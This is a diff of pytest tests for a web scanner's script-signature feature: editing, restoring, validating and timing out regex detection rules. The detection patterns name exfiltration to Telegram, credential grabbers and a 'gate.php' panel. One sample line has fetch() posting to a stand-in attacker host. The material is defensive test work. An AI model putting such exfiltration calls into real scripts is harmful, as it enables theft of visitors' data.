@@ -157,3 +157,110 @@ def test_the_scan_keeps_the_scripts_and_their_indicators(admin: TestClient, brow
     assert urlscan.scripts_path(scan["id"]).is_file()
     assert admin.delete(f"/api/artifacts/url-{scan['id']}", headers=key).status_code == 204
     assert not urlscan.scripts_path(scan["id"]).exists()
+
+
+# --------------------------------------------------------------------------- #
+# Signatures as data                                                          #
+# --------------------------------------------------------------------------- #
+SIG = "/api/script-signatures"
+MINE = {
+    "key": "team.gate",
+    "title": "Posts to a gate.php panel",
+    "severity": "high",
+    "points": 25,
+    "pattern": r"gate\.php",
+    "also": r"\bfetch\s*\(",
+}
+
+
+def test_the_signatures_nik_ships_are_rows_that_can_be_turned_off_changed_and_put_back(admin: TestClient):
+    listed = admin.get(SIG).json()
+    rows = {row["key"]: row for row in listed["signatures"]}
+    assert set(rows) == set(jsanalysis.BUILTIN) and listed["severities"] == ["high", "medium", "low"]
+    assert all(row["builtin"] and row["enabled"] and not row["changed"] for row in rows.values())
+    assert [row["severity"] for row in listed["signatures"]][0] == "high"  # the worst first
+    telegram = rows["exfil.telegram"]
+    assert telegram["pattern"] == jsanalysis.BUILTIN["exfil.telegram"].source and telegram["updatedBy"] == "nik"
+    # Off: the scans made from now on do not use it.
+    off = admin.put(f"{SIG}/{telegram['id']}", json={**telegram, "enabled": False})
+    assert off.status_code == 200 and not off.json()["enabled"] and not off.json()["changed"]
+    from app.core.db import SessionLocal
+
+    with SessionLocal() as db:
+        in_use = jsanalysis.load_signatures(db)
+        assert "exfil.telegram" not in {signature.id for signature in in_use}
+        assert "exfil.telegram" not in {f["id"] for f in jsanalysis.findings(GRABBER, in_use)}
+        assert "grabber.credentials" in {f["id"] for f in jsanalysis.findings(GRABBER, in_use)}
+    # Changed: fewer points, another title; its key stays whatever is sent.
+    changed = admin.put(f"{SIG}/{telegram['id']}", json={**telegram, "key": "other", "points": 5, "title": "Telegram"})
+    assert changed.status_code == 200
+    assert (changed.json()["key"], changed.json()["points"], changed.json()["changed"]) == ("exfil.telegram", 5, True)
+    with SessionLocal() as db:
+        found = {f["id"]: f for f in jsanalysis.findings(GRABBER, jsanalysis.load_signatures(db))}
+        assert found["exfil.telegram"]["points"] == 5 and found["exfil.telegram"]["title"] == "Telegram"
+        # A release does not take back what was changed here.
+        assert jsanalysis.seed(db, "2026-11-19T00:00:00+00:00") == 0
+    # One of Nik's is not deleted; it is put back as it shipped.
+    assert admin.delete(f"{SIG}/{telegram['id']}").status_code == 409
+    back = admin.post(f"{SIG}/{telegram['id']}/restore")
+    assert back.status_code == 200 and back.json()["points"] == 30 and not back.json()["changed"]
+    assert back.json()["updatedBy"] == "nik"
+    actions = [e["action"] for e in admin.get("/api/audit", params={"q": "action:signature.*"}).json()["entries"]]
+    assert sorted(actions) == ["signature.restore", "signature.update", "signature.update"]
+
+
+def test_a_signature_of_ones_own_is_checked_tried_and_used(admin: TestClient):
+    code = "fetch('https://evil.example/gate.php', {method: 'POST'})"
+    tried = admin.post(f"{SIG}/validate", json={**MINE, "code": code}).json()
+    assert tried["ok"] and tried["matches"] and tried["finding"]["id"] == "team.gate" and not tried["timedOut"]
+    # The second pattern must match too.
+    assert not admin.post(f"{SIG}/validate", json={**MINE, "code": "var a = 'gate.php'"}).json()["matches"]
+    assert admin.post(f"{SIG}/validate", json=MINE).json() == {"ok": True}
+    made = admin.post(SIG, json=MINE)
+    assert made.status_code == 201 and not made.json()["builtin"] and made.json()["updatedBy"] == "admin"
+    assert admin.post(SIG, json=MINE).status_code == 409
+    assert admin.post(SIG, json={**MINE, "key": "exfil.telegram"}).status_code == 409
+    from app.core.db import SessionLocal
+
+    with SessionLocal() as db:
+        meta = jsanalysis.analyse(code, kind="inline", signatures=jsanalysis.load_signatures(db))
+    assert [f["id"] for f in meta["findings"]] == ["team.gate"] and meta["severity"] == "high"
+    assert urlscan.with_scripts({"findings": []}, [meta])["score"] == 25
+    # Its own can be deleted; not restored.
+    assert admin.post(f"{SIG}/{made.json()['id']}/restore").status_code == 409
+    assert admin.delete(f"{SIG}/{made.json()['id']}").status_code == 204
+    viewer = make_key(admin, label="v", roles=["viewer"])
+    assert admin.get(SIG, headers=viewer).status_code == 200
+
+
+def test_a_pattern_that_cannot_be_used_is_refused_with_why(admin: TestClient):
+    def refused(**changes) -> dict:
+        answer = admin.post(SIG, json={**MINE, **changes})
+        assert answer.status_code == 400, answer.text
+        return answer.json()["detail"]
+
+    assert refused(key="Bad Key")["field"] == "key"
+    assert refused(title=" ")["field"] == "title"
+    assert refused(severity="critical")["field"] == "severity"
+    assert "cannot be read" in refused(pattern="(unclosed")["message"]
+    assert "empty text" in refused(pattern="a*")["message"]
+    assert refused(also="[")["field"] == "also"
+    # An expression that takes for ever on a long text is found before it is saved, not during a scan.
+    slow = refused(pattern=r"(a+)+$")
+    assert slow["field"] == "pattern" and "takes too long" in slow["message"]
+    assert admin.post(f"{SIG}/validate", json={**MINE, "pattern": r"(a+)+$"}).json()["ok"] is False
+    assert admin.post(SIG, json={**MINE, "points": 101}).status_code == 422
+
+
+def test_a_signature_that_takes_too_long_on_a_script_is_left_out_of_it(monkeypatch):
+    monkeypatch.setattr(jsanalysis, "MATCH_TIMEOUT", 0.05)
+    # Saved by an older Nik, or made slow by a text nobody foresaw: it must not stall the scan.
+    slow = jsanalysis._sig("slow.one", "high", 30, "Slow", r"(a+)+$")
+    quick = jsanalysis._sig("quick.one", "low", 5, "Quick", r"needle")
+    code = "needle " + "a" * 40_000 + "!"
+    timed_out: list[str] = []
+    found = jsanalysis.findings(code, [slow, quick], timed_out)
+    assert [f["id"] for f in found] == ["quick.one"] and timed_out == ["slow.one"]
+    meta = jsanalysis.analyse(code, kind="inline", signatures=[slow, quick])
+    assert meta["timedOut"] == ["slow.one"] and [f["id"] for f in meta["findings"]] == ["quick.one"]
+    assert "timedOut" not in jsanalysis.analyse("needle", kind="inline", signatures=[quick])
